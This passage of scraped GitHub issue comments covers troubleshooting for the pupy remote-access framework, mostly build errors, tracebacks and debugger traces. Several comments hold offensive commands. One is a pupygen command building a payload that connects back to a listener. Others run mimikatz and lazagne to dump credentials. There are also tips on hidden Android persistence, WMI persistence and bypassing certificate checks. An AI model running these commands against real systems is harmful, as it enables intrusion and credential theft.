such file or directory\ncp: cannot create regular file '.buildozer/android/platform/python-for-android/dist/pupy/src/org/renpy/android/PythonService.java': No such file or directory\ncp: cannot create regular file '.buildozer/android/platform/python-for-android/src/src/org/renpy/android/PythonActivity.java': No such file or directory\nrm: cannot remove 'bin/*.apk': No such file or directory\nBuildozer is running as root!\nThis is not recommended, and may lead to problems later.\nAre you sure you want to continue [y/n]? y\n()()() Ensure build layout\nNo buildozer.spec found in the current directory. Abandon.\ncopying the generated apk to ../../pupy/payload_templates/pupy.apk\ncp: cannot stat 'bin/Pupy-0.1-release-unsigned.apk': No such file or directory\nroot@kali:~/pouya21_MSF_WUI/pupy/client/android_sources# ./build.sh \nBuildozer is running as root!\nThis is not recommended, and may lead to problems later.\nAre you sure you want to continue [y/n]? n\ncat: ./.buildozer/android/platform/python-for-android/dist/pupy/templates/AndroidManifest.tmpl.xml: No such file or directory\nPatching AndroidManifest template for BOOT_COMPLETED\nsed: can't read ./.buildozer/android/platform/python-for-android/dist/pupy/templates/AndroidManifest.tmpl.xml: No such file or directory\nPatching AndroidManifest template for excludeFromRecents\nsed: can't read ./.buildozer/android/platform/python-for-android/dist/pupy/templates/AndroidManifest.tmpl.xml: No such file or directory\ncp: cannot create regular file '.buildozer/android/platform/python-for-android/dist/pupy/src/': No such file or directory\ncp: cannot create regular file '.buildozer/android/platform/python-for-android/dist/pupy/src/org/renpy/android/PythonService.java': No such file or directory\ncp: cannot create regular file '.buildozer/android/platform/python-for-android/src/src/org/renpy/android/PythonActivity.java': No such file or directory\nrm: cannot remove 'bin/*.apk': No such file or directory\nBuildozer is running as root!\nThis is not recommended, and may lead to problems later.\nAre you sure you want to continue [y/n]? n\ncopying the generated apk to ../../pupy/payload_templates/pupy.apk\ncp: cannot stat 'bin/Pupy-0.1-release-unsigned.apk': No such file or directory\n. Hi dear @n1nj4sec \nAre you planning/working to implement this feature on Puppy?\nBecause, I updated Puppy to latest version but I didn't find API feature.\nThanks.\n. ",
    "babanaweed": "I generate a android payload after installing it in my phone\nit's not giving me any session tnx. someone answer me fast please . ",
    "along7730": "thanx. on pull request. good. ",
    "xSynthx": "I have fixed my error, I guess I never added the python-dev via\nsudo apt-get install python-dev\nonce I ran ^^^ I ran\nsudo pip install netifaces\nThus fixing my run error, I hope this will also help someone else out! :). then what language?. or what do I put as the language?\n. ",
    "googleadmin1": "I also have this same error. \nI Noticed there is no PupyError Module within the pupylibs folder. \nAlso to note, the PupyServer.py uses:: from  import *. \nI commented out the first line out to see what would happen. I am by no means a master with python but I will experiment. \nAfter the first line was commented out, it read the next module was also not there.  The entire init.py in the pupylib appears to be the culprit. \nThe file PupyServer.py line 18 has a from (*) import  .. The * with with no following declaration seems a little off as well. \nThe odd part is the \"modules\" do exist, but only as part of the same program. -- Isn't an illegal move? How does the system use a lib that it is currently reading from. Again sorry for the noob question. \nThis project is amazing! Reading line by line I'm excited to use it in my research. \nthanks -- Look forward to learning the fix. . Cheers!\nI'm on got, I'll throw a shout into the comment block for you.\nThanks again!\nI'm so pumped for this project!\nOn Wed, Feb 22, 2017 at 10:44 AM n1nj4sec notifications@github.com wrote:\n\nuse python 2.7, not python 3, I will add a warning concerning the version 3\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/306#issuecomment-281707208, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AWhMfME52AZvVFAilrlDeBhBtkuTWzZUks5rfFfogaJpZM4MEYXX\n.\n. \n",
    "inside-shellshock": "\n\nrun lazagne \n[-] 'module' object has no attribute 'runLaZagne'\n\n\n========= Remote Traceback (1) =========\nTraceback (most recent call last):\n  File \"C:\\Python27\\lib\\site-packages\\rpyc\\core\\protocol.py\", line 305, in _dispatch_request\n  File \"C:\\Python27\\lib\\site-packages\\rpyc\\core\\protocol.py\", line 541, in _handle_getattr\n  File \"C:\\Python27\\lib\\site-packages\\rpyc\\core\\protocol.py\", line 507, in _access_attr\nAttributeError: 'module' object has no attribute 'runLaZagne'\ni have typed the \"space\" :'). Che poi possiamo anche parlare nella madrelingua.\nUP UP!. Aless\u00e0, i have cloned pupy again, update lazagne to the new version, but pupy gave me same error.\nWe should talk in PM \ud83d\ude2d . ",
    "noh950": "Thank you OBuntu for you help. I did what what you suggested and got this; \nroot@localhost:~/pupy/pupy/external# git clone https://github.com/AlessandroZ/LaZagne\nCloning into 'LaZagne'...\nremote: Counting objects: 1641, done.\nerror: RPC failed; curl 56 GnuTLS recv error (-9): A TLS packet with unexpected length was received.\nfatal: The remote end hung up unexpectedly\nfatal: early EOF\nfatal: index-pack failed. Thanks you OBuntu !\nIt solved the problem.. This problem is caused by the non updated submodule.. ",
    "jusch2211": "I have the package build-essentials installed, as well as wine. \nDo I need another version?\nThanks. ",
    "dc3l1ne": "in line:102 and 120,if self.client.desc['intgty_lvl'] != \"High\",what if the privilege is SYSTEM?I try to change it to if self.client.desc['intgty_lvl'] != \"High\" and self.client.desc['intgty_lvl'] != \"System\" and its work nice with wmi subscription.I think wmi subscription startup is better than registry's.. ",
    "LAzyFrAAnk": "Have tested and work fine on win XP, 7 and 10 with Chinese (simplified and traditional). Definitely yes..... :p \nif ok, add my frank0957@jabbim.pl to discuss. @alxchk @n1nj4sec @AlessandroZ Thanks for your reply. I will try to coming week. Will let you know the outcome. And I may plan to make UI to pupy and test some WOL script to remote host. hope let it amazing. Coz have time. :P   . @alxchk Alright, I'll put efforts in other directions. \nAnd just got some errors  after upgraded pupy by git. \n\n. hi @alxchk Got the below error after recompiled #96bbb4f \n\n. hmmm...... no idea on it.... just rechecking again.. @alxchk  problem solved, I made stupid mistake. Anyways, I really appreciated your help. And will close this ticket after test all features . Just tested, everything is working fine, just little error as below \n\n. @n1nj4sec @alxchk @AlessandroZ \nLanguage display problem had been solved, even Chinese with traditional, simplified, Russian, Japanese . Many tks all guys effort  \n\n. ",
    "nostaldamask": "I experienced the same problem and I was able to resolve it by,\n1) Changing the copy path for PythonActivity.java in build.sh\n```\npupy/client/android_sources/build.sh\n- cp PythonActivity.java .buildozer/android/platform/python-for-android/src/src/org/renpy/android/PythonActivity.java\n+ cp PythonActivity.java .buildozer/android/platform/python-for-android/dist/pupy/src/org/renpy/android/PythonActivity.java\n2) Uncommenting setContentView in PythonActivity.java\npupy/client/android_sources/PythonActivity.java\n- //setContentView(mView);\n+ setContentView(mView);\n```\n. ",
    "santidediego": "I'm running pupysh in mac (the server) and the payload in a Linux system. It seem's that the payload is correctly generated but when I execute it in Linux while the server is running in my mac I have an error (handshake error) in my Linux terminal. I'll keep investigating.. ",
    "rtriplettOnGit": "To me it looks like I'm missing some packages from python maybe?\n. Thank you so much! That point me in the right area to find my error. I had to re-install pip and install python3 then it worked. Thanks!. ",
    "CyDoor": "ty 4 youre fast reply & the information.. if you r behind a firewall or router, the public ip is not set at your local eth.\nif so, you can pupy let listen to 0.0.0.0, then pupy listen to port 4444 on all incoming connections. https://github.com/n1nj4sec/pupy/wiki/Generate-payloads. ",
    "BuffaloWill": "Thanks @AlessandroZ. \nI will close this PR and create a new one.. ",
    "CG-root": "I have noticed that the Windows payload of Pupy consumes at least 300mb RAM.\nIs that normal?. @alxchk , I see that it's consuming a lot of memory like ~300Mb.\nCan I choose which modules to load?. @alxchk , is there a way to debug this behavior why it's consuming so much RAM ? . I think I will skip on that. is it easier now to build your version?\nI mean that two months ago I tried and you told me that I need to make a\nlot of things in order for that to work\nOn Thu, Aug 9, 2018, 19:22 alxchk notifications@github.com wrote:\n\nThere is no easy way to debug this. You can try to monitor which sequence\nof actions leads to this. Initial consumption should be around 22-26 mb\ndepends on situation. Then try to figure out which actions trigger memory\ngrowing\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/348#issuecomment-411815902, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AX4LsOZnAd74Eo-p_hQw2UJgEG-x-62-ks5uPGHIgaJpZM4M4gOA\n.\n. @alxchk , I have used the prebuilt option and installed it on Debian 9.\nThe problem is that the ps1 one liner option still consumes high amount of RAM.\nOn Windows 10, the powershell.exe process consumes ~200mb RAM.\nIs that normal?. I agree. I have now used the exe option and the process consumes ~20Mb only. Can we do like if the ssl handshake of server fails then it will serve the payload?. I must change the code for that, right?\n\nI changed the conf like you said and the server is running but the payload part is missing , correct?. I don't think I quite understand.\nafter I changed the settings. pupy server is working. but is there a way to access the payload like that and to serve the powershell payload :\nhttps://[Pupy server IP]/eiloShaegae1. I did try to create some file on wwwroot and GET it, but it doesn't work. If log-lvl = DEBUG then after request server says:\n[-] ::1:39404: GET ['test.txt'] | SECRET = TNmee\nDEBUG:root:No clients matches request: \nERROR:root:Traceback (most recent call last):\n  File \"/root/pupy/pupy/pupylib/PupyService.py\", line 56, in on_connect\n    self.namespace=self._conn.root.namespace\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/core/protocol.py\", line 515, in root\n    self._remote_root = self.sync_request(consts.HANDLE_GETROOT)\n  File \"/root/pupy/pupy/network/lib/connection.py\", line 78, in sync_request\n    if not self.serve(self._serve_timeout):\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/core/protocol.py\", line 411, in serve\n    data = self._recv(timeout, wait_for_lock = True)\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/core/protocol.py\", line 368, in _recv\n    if self._channel.poll(timeout):\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/core/channel.py\", line 43, in poll\n    return self.stream.poll(timeout)\n  File \"/root/pupy/pupy/network/lib/streams/PupySocketStream.py\", line 120, in poll\n    result = ( len(self.upstream)>0 or self.sock_poll(timeout) )\n  File \"/root/pupy/pupy/network/lib/streams/PupySocketStream.py\", line 143, in sock_poll\n    self.transport.downstream_recv(self.buf_in)\n  File \"/root/pupy/pupy/network/lib/base.py\", line 183, in downstream_recv\n    self.chain[idx].downstream_recv(data)\n  File \"/root/pupy/pupy/network/lib/transports/httpwrap.py\", line 134, in downstream_recv\n    self._handle_http(payload)\n  File \"/root/pupy/pupy/network/lib/transports/httpwrap.py\", line 123, in _handle_http\n    self.close()\n  File \"/root/pupy/pupy/network/lib/base.py\", line 72, in close\n    raise EOFError()\nEOFError\n. what arguments should be supplied to pupygen?. pupysh does not have -f argument.. where do I need to type this:\n\"gen -f py\" \n?. ok. sorry for that :). I now understand. really appreciated for you help and patience.. @alxchk , is there a way to contact with you.\nI would like to ask you few general questions about Pupy.\nThanks.. @alxchk how can you log the entire session?. @alxchk , is there a way to use non self-signed CA certificate?\nI have tried to change the CA certificate with a COMODO CA certificate (PupyCredentials.py). The problem is that when I try to connect with the client, it says \"unknown CA\". What should be changed in order for this to work?\nThank you. yes. because some customers are using firewall that checks for known CA for HTTPS sessions, otherwise session gets dropped.\nAs I have noticed checking the TLS handshake, I saw that client is sending its certificate and then I receive an error from server saying \"Unknown CA\". Is it possible to cancel the CA check like on a regular connection for downloading the payload?. What should be modified in order to completely disable the check?\n. thanks @alxchk .\nI'm now trying to rebuild the template but got some errors like:\n/root/pupy-new/pupy/client/sources/buildenv/win64/python.sh ../build_library_zip.py -windows\nTraceback (most recent call last):\n  File \"../build_library_zip.py\", line 11, in <module>\n    import pp\n  File \"..\\..\\pupy\\pp.py\", line 59, in <module>\n    from network import conf\n  File \"..\\..\\pupy\\network\\conf.py\", line 6, in <module>\n    from .lib.launchers.connect import ConnectLauncher\n  File \"..\\..\\pupy\\network\\lib\\__init__.py\", line 11, in <module>\n    from .transports.aes import AES256, AES128\n  File \"..\\..\\pupy\\network\\lib\\transports\\aes.py\", line 15, in <module>\n    from Crypto.Protocol.KDF import PBKDF2\n  File \"C:\\Python27\\lib\\site-packages\\Crypto\\Protocol\\KDF.py\", line 39, in <module>\n    from Crypto.Hash import SHA1, SHA256, HMAC, CMAC\n  File \"C:\\Python27\\lib\\site-packages\\Crypto\\Hash\\SHA256.py\", line 39, in <module>\n    from Crypto.Util._raw_api import (load_pycryptodome_raw_lib,\n  File \"C:\\Python27\\lib\\site-packages\\Crypto\\Util\\_raw_api.py\", line 39, in <module>\n    ffi = FFI()\n  File \"C:\\Python27\\lib\\site-packages\\cffi\\api.py\", line 63, in __init__\n    from . import cparser\n  File \"C:\\Python27\\lib\\site-packages\\cffi\\cparser.py\", line 7, in <module>\n    import pycparser\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\__init__.py\", line 14, in <module>\n    from .c_parser import CParser\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\c_parser.py\", line 20, in <module>\n    class CParser(PLYParser):\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\plyparser.py\", line 95, in template\n    _create_param_rules(cls, method)\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\plyparser.py\", line 112, in _create_param_rules\n    param_rule.__doc__ = func.__doc__.replace('xxx', xxx).replace('yyy', yyy)\nAttributeError: 'NoneType' object has no attribute 'replace'\nMakefile:71: recipe for target 'resources/library.zip' failed\nmake: *** [resources/library.zip] Error 1\nIs there any recommended distribution to perform this action ?\n. I did so but still not working. when setting --lvl DEBUG, I see:\n\nfailed to authenticate, rejecting connection\n\n. @alxchk big thanks.\nIt's finally work. In addition to your proposed steps, I had to comment out below lines in clients.py:\nfor (item) in peer['subject']:\n            if item[0][0] == 'organizationalUnitName':\n                peer_role = item[0][1] '\n      if not ( self.ROLE == 'CLIENT' and peer_role == 'CONTROL' or \\\n          self.ROLE == 'CONTROL' and peer_role == 'CLIENT' ):\n          raise ValueError('Invalid peer role: {}'.format(peer_role))\nand changed the value found above the code from peer_role = '' to peer_role = 'CLIENT'\nI did it because in my certificate the subject field does not contain the strings CLIENT or CONTROL.\nFrom your experience, is this modification can cause any issues?\nIn addition, should I also comment out the same code found in conf.py?. @reillychase , I would be more than happy to assist, that's a great idea !. @n1nj4sec , not really. looking on the request performed by the client using Wireshark (doing SSL decryption) to get the ps1 file, it seems that after performing the handshake with the server, the GET request is being SSL segmented:\nGET /randomfile.ps1 HTTP/1.1\nThe first byte which is the letter G is the first segment and after that the rest of the request in the second segment.\nInserting the command \"print payload\" beneath payload = data.read() command in downstream_recv function found in httpwrap.py file shows that only the first SSL segment is acknowledged by the server, thus the server does not fully see the entire request. I tried to mess with PupySocketStream.py file, but with no luck :(\n. @leapordcaun , if you execute the Powershell without hidden flag, what do you see?. @alxchk , do you have any way to check this issue?. Anyone knows?. Thanks.\nbtw, I noticed that you update your branch more frequently. How can I use (=build) it ? :). I'm trying to build it using build-docker.sh. but I get:\n[+] Compile pykcp\nDirectory '../../pupy/external/pykcp' is not installable. File 'setup.py' not found.\nYou are using pip version 9.0.3, however version 10.0.1 is available.\nYou should consider upgrading via the 'pip install --upgrade pip' command.\nAnd then script terminates\n. What are the main features in your branch ?\n. ok using --recursive flag it is working, what should I suppose to perform after executing docker start -a build-pupy-linux64 ?. I'm using Kali 2018.2 distro. what arguments should I supply to create-workspace ?. @alxchk , as a side note, it would be great if you can write short explanation in wiki on your fork on how to build it.\nAdditionally, it can be great if we can have an IRC channel so that people can ask questions or consult about pupy. . auto_proxy launcher on win7x64 with PAC doesn't work. pupy has support for pac file?\nit knows how to parse it?\nOn Tue, Feb 12, 2019, 19:02 alxchk notifications@github.com wrote:\n\nThe horrible thing about PAC is JS sitting inside..\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/729#issuecomment-462843622, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AX4LsNEMOtc0if0OAOFkaNFX27hzWItLks5vMvObgaJpZM4ai5tW\n.\n. highly appreciated. it is vital as many organizations are using pac file.\nthank you\n\nOn Tue, Feb 12, 2019, 23:27 alxchk notifications@github.com wrote:\n\nNo. Will try to port\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/729#issuecomment-462942028, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AX4LsGu0Or731MVIRruFluI7TsUCXGpoks5vMzGpgaJpZM4ai5tW\n.\n. I can't tell. why is it important?. I think PyPAC can do it as mentioned here.\nThe only thing is that it does not support DHCP method at the moment.. great. I will create a lab, check that and will update you.\nbtw, I remember there was a page in wiki that Instructs how to install your\nversion. where can I find it?\n\nOn Wed, Feb 20, 2019, 23:34 alxchk notifications@github.com wrote:\n\nYou are welcome to try:\nalxchk@5351203\nhttps://github.com/alxchk/pupy/commit/5351203af272c3bba71ef8b156c3ebf58605d632\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/729#issuecomment-465763336, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AX4LsK53nDo3CW0cVQ9rydfLO1vKr0eFks5vPb9qgaJpZM4ai5tW\n.\n. instead of git clone --recursive https://github.com/n1nj4sec/pupy what should I execute?. \n",
    "adalenv": "i hav forwarded the port. \n\n. I would be very grateful if you make a tutorial video with public ip\nthanks. ",
    "Omardavinci": "Yeah but you are using a shellcode to load a dll. i was refering to a single shellcode to starts a command shell.\ni mean something like this:\nhttps://community.rapid7.com/thread/7748\n. ",
    "fastfire": "mmm... why closed?. ",
    "hughpen15": "so i changed 'exe_x64' to 'client' and this came out , everybody seems to be okay with either 'exe_x64' or 'exe_x86' tho\n~/pupy.lel/pupy# ./pupygen.py -f client -o cunt.exe --randomize-hash connect --host 192.168.1.8:443 --transport ssl\n[+] Generate client: windows/x86\n[C] launcher: connect\n[C] launcher_args: ['--host', '192.168.1.8:443', '--transport', 'ssl']\n[C] offline_script: \n6eEkFbxCC9H9m2nAec4DOkHxJGwbNN5Wn6s3WRDY\n@n1nj4sec \n. ",
    "dkfx": "I am able to get the payload delivered using the base64 encoded powershell command but the plaintext command returns the same error for me as @AlessandroZ. I had to specify the transport as http however before I could get it to generate.\nIf I was using SSL I received this error:\nroot@ip:/home/ubuntu/pupy/pupy# ./pupygen.py -f ps1_oneliner --ps1-oneliner-listen-port 443 \n connect --host x.x.x.x\nhere\nERROR:root:ThreadedHTTPServer instance has no attribute 'tmp_cert_path'\nTraceback (most recent call last):\n  File \"./pupygen.py\", line 545, in <module>\n    pupygen(parser.parse_args(), config)\n  File \"./pupygen.py\", line 529, in pupygen\n    serve_ps1_payload(conf, link_ip=link_ip, port=args.ps1_oneliner_listen_port, useTargetProxy=True)\n  File \"/home/ubuntu/pupy/pupy/pupylib/payloads/ps1_oneliner.py\", line 159, in serve_ps1_payload\n    server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)\n  File \"/usr/lib/python2.7/SocketServer.py\", line 420, in __init__\n    self.server_close()\n  File \"/home/ubuntu/pupy/pupy/pupylib/payloads/ps1_oneliner.py\", line 152, in server_close\n    os.unlink(self.tmp_cert_path)\nAttributeError: ThreadedHTTPServer instance has no attribute 'tmp_cert_path'\nThreadedHTTPServer instance has no attribute 'tmp_cert_path'. ",
    "grafnugi": "Same problem persists. Any other ideas?. That error occurs when I try to generate a dnscnc payload... when i try to generate a pyinst payload with ssl transport I get\n[+] Required credentials:\n[+] SSL_BIND_CERT, SSL_CA_CERT, SSL_CLIENT_CERT, SSL_BIND_KEY, SSL_CLIENT_KEY\nThis problem persists over multiple different servers that I have tested.. I scanned the port with nmap, and it says it is closed, then when I try to run pupysh.py, i get the same error. how can i tell what is using the port, if indeed it is in use?. ",
    "xuxuedong": "thanks a lot. hey guy, you should RTFM. @Rhuax if you ssh to the target, that you cannot install pyautogui, you must connect to the target use something like vnc. If your vps is ubuntu. hey, i have the same question, is that mean, i must compiled the template by myself?. isn't it the sources-linux and sources located in https://github.com/n1nj4sec/pupy/tree/unstable/client?. You can have a try nssm for windows platform. which os do you use?\nand\nthe full command for generating \"client\"?. what's meaing of \"using ./puppysy.py for client\"?. is there, sources-linux and sources -> https://github.com/n1nj4sec/pupy/tree/unstable/client\nand the instructions is there -> https://github.com/n1nj4sec/pupy/wiki/Build-payloads-from-sources. @TheMostGloriousAsteroids have a test of python 2.7.x. have you installed rpyc inside the requirements.txt correctly?. ",
    "mamoudmatook": "Internet connection is woking \nSettings of what ?. ",
    "b0nete": "I have same problem. The curious is a never enter a password.. ",
    "Fabbe041": "how can i change it?\n. ",
    "gavz": "i installed on Kali Linux >  wait a few minutes. ",
    "whit3he4d": "just force pupygen -f client for using the dll payload template. thank you very much. now its clear to me. but i think sizeof is fine cause rawData is implemented as \nunsigned char rawData[3385344]. RTFM. ",
    "brettmcintosh": "socketserver is part of the python standard lib, it just has a camel case name in python2.  . ",
    "jiraiyalegendarysannin": "Hi @alxchk, \nUnfortunately, your patch did not work for me. Pupy session becomes unresponsive, right after I execute run memory_exec /usr/share/mimikatz/x64/mimikatz.exe privilege::debug sekurlsa::logonPasswords. I have to ctrl^c and interact with another session. Though I do not get the \"-No module named memexec\" error anymore.. Yes, I cloned your unstable repo. I also copied the patched files to this repo and encountered exact same result. \nI tried with wce.exe and got the same result. The program crashed with the following exception. \n``\n(4574.cec): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n000002cc0c4110dd 813850450000    cmp     dword ptr [rax],4550h ds:00000000`0e989cb8=????????\n0:001> r\nrax=000000000e989cb8 rbx=000002cc0ee45620 rcx=00000000000000e8\nrdx=0000000000000ac0 rsi=0000000000000000 rdi=000002cc0c411390\nrip=000002cc0c4110dd rsp=000000fb37cfe5e0 rbp=000002cc0e95be08\n r8=000002cc0e989bd0  r9=0000000000008000 r10=000002cc0a185f30\nr11=000000fb37cfd760 r12=000002cc0ee45620 r13=000002cc0e474fb8\nr14=000002cc0e474fe8 r15=000002cc0e970420\niopl=0         nv up ei pl nz na po nc\ncs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010204\n000002cc0c4110dd 813850450000    cmp     dword ptr [rax],4550h ds:000000000e989cb8=????????\n```\n. Well, I thought I do not require to build templates again since I cloned from your repo. I just executed buildenv.sh and build.sh. Even though there were some errors regarding with wine, build.sh managed to compile new templates. However new templates does not solve the issue, I mean I did not get exception but this time pupy hangs. It seems like it continuously opens and closes new threads.\n``\n(2d48.2878): Break instruction exception - code 80000003 (first chance)\nntdll!DbgBreakPoint:\n00007ff85fdc8d70 cc              int     3\n0:004> t\nntdll!DbgBreakPoint+0x1:\n00007ff85fdc8d71 c3              ret\n0:004> t\nntdll!DbgUiRemoteBreakin+0x4b:\n00007ff85fdf536b eb00            jmp     ntdll!DbgUiRemoteBreakin+0x4d (00007ff85fdf536d)\n0:004> t\nntdll!DbgUiRemoteBreakin+0x4d:\n00007ff85fdf536d 33c9            xor     ecx,ecx\n0:004> t\nntdll!DbgUiRemoteBreakin+0x4f:\n00007ff85fdf536f e87c86f6ff      call    ntdll!RtlExitUserThread (00007ff85fd5d9f0)\n0:004> t\nntdll!RtlExitUserThread:\n00007ff85fd5d9f0 4053            push    rbx\n0:004> t\nntdll!RtlExitUserThread+0x2:\n00007ff85fd5d9f2 4883ec30        sub     rsp,30h\n0:004> t\nntdll!RtlExitUserThread+0x6:\n00007ff85fd5d9f6 8364244800      and     dword ptr [rsp+48h],0 ss:0000000c4a77f7f8=00000000\n0:004> t\nntdll!RtlExitUserThread+0xb:\n00007ff85fd5d9fb 4c8d442448      lea     r8,[rsp+48h]\n0:004> t\nntdll!RtlExitUserThread+0x10:\n00007ff85fd5da00 488364242000    and     qword ptr [rsp+20h],0 ss:0000000c4a77f7d0=0000000000000000\n0:004> t\nntdll!RtlExitUserThread+0x16:\n00007ff85fd5da06 41b904000000    mov     r9d,4\n0:004> t\nntdll!RtlExitUserThread+0x1c:\n00007ff85fd5da0c 8bd9            mov     ebx,ecx\n0:004> t\nntdll!RtlExitUserThread+0x1e:\n00007ff85fd5da0e 48c7c1feffffff  mov     rcx,0FFFFFFFFFFFFFFFEh\n0:004> t\nntdll!RtlExitUserThread+0x25:\n00007ff85fd5da15 418d5108        lea     edx,[r9+8]\n0:004> t\nntdll!RtlExitUserThread+0x29:\n00007ff85fd5da19 e8227e0600      call    ntdll!NtQueryInformationThread (00007ff85fdc5840)\n0:004> t\nntdll!NtQueryInformationThread:\n00007ff85fdc5840 4c8bd1          mov     r10,rcx\n0:004> t\nntdll!NtQueryInformationThread+0x3:\n00007ff85fdc5843 b825000000      mov     eax,25h\n0:004> t\nntdll!NtQueryInformationThread+0x8:\n00007ff85fdc5848 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (000000007ffe0308)],1 ds:000000007ffe0308=00\n0:004> t\nntdll!NtQueryInformationThread+0x10:\n00007ff85fdc5850 7503            jne     ntdll!NtQueryInformationThread+0x15 (00007ff85fdc5855) [br=0]\n0:004> t\nntdll!NtQueryInformationThread+0x12:\n00007ff85fdc5852 0f05            syscall\n0:004> t\nntdll!NtQueryInformationThread+0x14:\n00007ff85fdc5854 c3              ret\n0:004> t\nntdll!RtlExitUserThread+0x2e:\n00007ff85fd5da1e 85c0            test    eax,eax\n0:004> t\nntdll!RtlExitUserThread+0x30:\n00007ff85fd5da20 7807            js      ntdll!RtlExitUserThread+0x39 (00007ff85fd5da29) [br=0]\n0:004> t\nntdll!RtlExitUserThread+0x32:\n00007ff85fd5da22 837c244800      cmp     dword ptr [rsp+48h],0 ss:0000000c4a77f7f8=00000000\n0:004> t\nntdll!RtlExitUserThread+0x37:\n00007ff85fd5da27 7515            jne     ntdll!RtlExitUserThread+0x4e (00007ff85fd5da3e) [br=0]\n0:004> t\nntdll!RtlExitUserThread+0x39:\n00007ff85fd5da29 e88243feff      call    ntdll!LdrShutdownThread (00007ff85fd41db0)\n0:004> t\nntdll!LdrShutdownThread:\n00007ff85fd41db0 48895c2410      mov     qword ptr [rsp+10h],rbx ss:0000000c4a77f7b8=0000000000000000\n0:004> t\nntdll!LdrShutdownThread+0x5:\n00007ff85fd41db5 4889742418      mov     qword ptr [rsp+18h],rsi ss:0000000c4a77f7c0=0000000000000000\n0:004> t\nntdll!LdrShutdownThread+0xa:\n00007ff85fd41dba 57              push    rdi\n0:004> t\nntdll!LdrShutdownThread+0xb:\n00007ff85fd41dbb 4154            push    r12\n0:004> t\nntdll!LdrShutdownThread+0xd:\n00007ff85fd41dbd 4155            push    r13\n0:004> t\nntdll!LdrShutdownThread+0xf:\n00007ff85fd41dbf 4156            push    r14\n0:004> t\nntdll!LdrShutdownThread+0x11:\n00007ff85fd41dc1 4157            push    r15\n0:004> t\nntdll!LdrShutdownThread+0x13:\n00007ff85fd41dc3 4881ecd0000000  sub     rsp,0D0h\n0:004> t\nntdll!LdrShutdownThread+0x1a:\n00007ff85fd41dca 65488b1c2530000000 mov   rbx,qword ptr gs:[30h] gs:0000000000000030=????????????????\n0:004> t\nntdll!LdrShutdownThread+0x23:\n00007ff85fd41dd3 654c8b2c2560000000 mov   r13,qword ptr gs:[60h] gs:0000000000000060=????????????????\n0:004> t\nntdll!LdrShutdownThread+0x2c:\n00007ff85fd41ddc 488bb3c8170000  mov     rsi,qword ptr [rbx+17C8h] ds:0000000c49f157c8=0000000000000000\n0:004> t\nntdll!LdrShutdownThread+0x33:\n00007ff85fd41de3 4533e4          xor     r12d,r12d\n0:004> t\nntdll!LdrShutdownThread+0x36:\n00007ff85fd41de6 4885f6          test    rsi,rsi\n0:004> t\nntdll!LdrShutdownThread+0x39:\n00007ff85fd41de9 7408            je      ntdll!LdrShutdownThread+0x43 (00007ff85fd41df3) [br=1]\n0:004> t\nntdll!LdrShutdownThread+0x43:\n00007ff85fd41df3 65488b042530000000 mov   rax,qword ptr gs:[30h] gs:0000000000000030=????????????????\n0:004> t\nntdll!LdrShutdownThread+0x4c:\n00007ff85fd41dfc f680ee17000008  test    byte ptr [rax+17EEh],8 ds:0000000c49f157ee=08\n0:004> t\nntdll!LdrShutdownThread+0x53:\n00007ff85fd41e03 0f85db350900    jne     ntdll!LdrShutdownThread+0x93634 (00007ff85fdd53e4) [br=1]\n0:004> t\nntdll!LdrShutdownThread+0x93634:\n00007ff85fdd53e4 65488b042530000000 mov   rax,qword ptr gs:[30h] gs:0000000000000030=????????????????\n0:004> t\nntdll!LdrShutdownThread+0x9363d:\n00007ff85fdd53ed f680ee17000020  test    byte ptr [rax+17EEh],20h ds:0000000c49f157ee=08\n0:004> t\nntdll!LdrShutdownThread+0x93644:\n00007ff85fdd53f4 0f84a5cbf6ff    je      ntdll!LdrShutdownThread+0x1ef (00007ff85fd41f9f) [br=1]\n0:004> t\nntdll!LdrShutdownThread+0x1ef:\n00007ff85fd41f9f 4885f6          test    rsi,rsi\n0:004> t\nntdll!LdrShutdownThread+0x1f2:\n00007ff85fd41fa2 741e            je      ntdll!LdrShutdownThread+0x212 (00007ff85fd41fc2) [br=1]\n0:004> t\nntdll!LdrShutdownThread+0x212:\n00007ff85fd41fc2 488bbb80170000  mov     rdi,qword ptr [rbx+1780h] ds:0000000c49f15780=0000000000000000\n0:004> t\nntdll!LdrShutdownThread+0x219:\n00007ff85fd41fc9 4885ff          test    rdi,rdi\n0:004> t\nntdll!LdrShutdownThread+0x21c:\n00007ff85fd41fcc 752b            jne     ntdll!LdrShutdownThread+0x249 (00007ff85fd41ff9) [br=0]\n0:004> t\nntdll!LdrShutdownThread+0x21e:\n00007ff85fd41fce f683ee17000004  test    byte ptr [rbx+17EEh],4 ds:0000000c49f157ee=08\n0:004> t\nntdll!LdrShutdownThread+0x225:\n00007ff85fd41fd5 755a            jne     ntdll!LdrShutdownThread+0x281 (00007ff85fd42031) [br=0]\n0:004> t\nntdll!LdrShutdownThread+0x227:\n00007ff85fd41fd7 e8e4520500      call    ntdll!RtlFreeThreadActivationContextStack (00007ff85fd972c0)\n0:004> 